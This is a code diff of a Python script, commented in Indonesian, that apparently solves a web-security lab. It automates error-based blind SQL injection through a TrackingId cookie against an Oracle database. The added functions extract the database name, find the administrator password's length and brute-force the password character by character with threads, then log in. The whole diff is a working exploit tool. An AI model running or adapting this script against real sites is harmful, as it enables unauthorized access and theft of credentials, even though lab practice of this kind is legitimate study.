@@ -15,13 +15,48 @@ def get_cookies_with_requests(url):
         print(f"Terjadi kesalahan: {e}")
         return None
 
-def get_csrf_token(client, url): #diperlukan dikarenakan sebagai token untuk melakukan get dan post
+def get_csrf_token(client, url):
     r = client.get(url)
     soup = BeautifulSoup(r.text, 'html.parser') #melakukan scrapping web
     csrf_token = soup.find('input', attrs={'name': 'csrf'}) #mengambil token csrf
     if csrf_token:
         return csrf_token['value']
     return None
+
+def try_database_char(base_url, tracking_id, position, char):
+    payload = f"' || (SELECT CASE WHEN SUBSTR(ora_database_name, {position}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '" #belum fix
+    cookies = {
+        'TrackingId': tracking_id + payload
+    }
+
+    response = requests.get(base_url, cookies=cookies)
+
+    if response.status_code == 500:
+        print(f"Karakter ke-{position} benar: {char}")
+        return char
+    elif response.status_code == 200:
+        print(f"Karakter ke-{position} salah: {char}")
+    return None
+
+def bruteforce_database_name(base_url, tracking_id, threads):
+    database_name = ''
+    position = 1
+    while True:
+        found_char = None
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(try_database_char, base_url, tracking_id, position, char) for char in charset]
+
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    found_char = result
+                    database_name += result
+                    break
+        
+        if found_char is None:  # Jika tidak ada karakter yang ditemukan, berarti nama database selesai
+            break
+        position += 1
+    return database_name
 
 def try_password_char(base_url, tracking_id, position, char):
     payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password, {position}, 1)='{char}') || '"
@@ -38,9 +73,23 @@ def try_password_char(base_url, tracking_id, position, char):
         print(f"Karakter ke-{position} salah: {char}")
     return None
 
-def bruteforce_password(base_url, tracking_id, threads):
+def length_password(base_url, tracking_id):
+    length = 0
+    while True:
+        payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>{length}) || '"
+        cookies = {
+        'TrackingId': tracking_id + payload
+    }
+        response = requests.get(base_url, cookies=cookies)
+        if response.status_code == 500:
+            length += 1
+        else:
+            break
+    return length
+
+def bruteforce_password(base_url, tracking_id, threads, length):
     password = ''
-    for position in range(1, 21):
+    for position in range(1, length+1):
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = [executor.submit(try_password_char, base_url, tracking_id, position, char) for char in charset]
 
@@ -75,7 +124,18 @@ def main():
 
     if tracking_id:
         print(f"TrackingId: {tracking_id}")
-        password = bruteforce_password(base_url, tracking_id, threads)
+        
+        # Cek nama database
+        print("\nMemulai brute-force nama database...")
+        database_name = bruteforce_database_name(base_url, tracking_id, threads)
+        print(f"Nama database yang ditemukan: {database_name}")
+
+        # Cek panjang password
+        length = length_password(base_url, tracking_id)
+        print(f"Panjang Password: {length}")
+        
+        # Brute-force password
+        password = bruteforce_password(base_url, tracking_id, threads, length)
         print(f"\nPassword administrator yang ditemukan: {password}")
         login(base_url, password)        
     else:
